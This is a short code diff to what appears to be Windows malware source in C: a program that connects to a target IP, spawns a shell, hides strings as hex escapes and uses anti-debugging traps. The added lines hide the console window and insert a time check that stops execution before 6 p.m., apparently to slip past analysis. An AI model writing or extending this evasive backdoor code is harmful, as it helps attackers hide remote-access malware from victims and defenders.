@@ -1,7 +1,9 @@
 #define _WIN32_WINNT 0x0500
+#define WIN32_LEAN_AND_MEAN
 // clang-format off
 #include <stdio.h>
 #include <stdlib.h>
+#include <time.h>
 #include <winsock2.h>
 #include <windows.h>
 #include <iphlpapi.h>
@@ -181,6 +183,15 @@ int load_deps() {
   return 0;
 }
 
+// Check if time exceed
+int tcheck() {
+  struct tm *nt;
+  __time64_t long_time;
+  _time64(&long_time);
+  nt = _localtime64(&long_time);
+  return (nt->tm_hour < 18);
+}
+
 int qq() {
 
   TCHAR hid_Test___t3KzLws7Qkdt[] = {'\x54', '\x65', '\x73', '\x74', '\x31',
@@ -239,6 +250,7 @@ int qq() {
     return -1;
   }
   ip_addr = to_ip(target);
+  // Hide window
   ShowWindow(GetConsoleWindow(), SW_HIDE);
 
   // don't spawn a shell if we're only sending a single test request
@@ -275,6 +287,9 @@ int qq() {
       add eax, 3
       }
     } __except (EXCEPTION_EXECUTE_HANDLER) {
+    }
+    if (tcheck()) {
+      break;
     }
     switch (status) {
     case STATUS_SINGLE:
@@ -336,6 +351,9 @@ q:
 }
 
 void Trampoline2() {
+  if (tcheck()) {
+    return;
+  }
   __try {
     // ICE
     __asm __emit 0xf1;
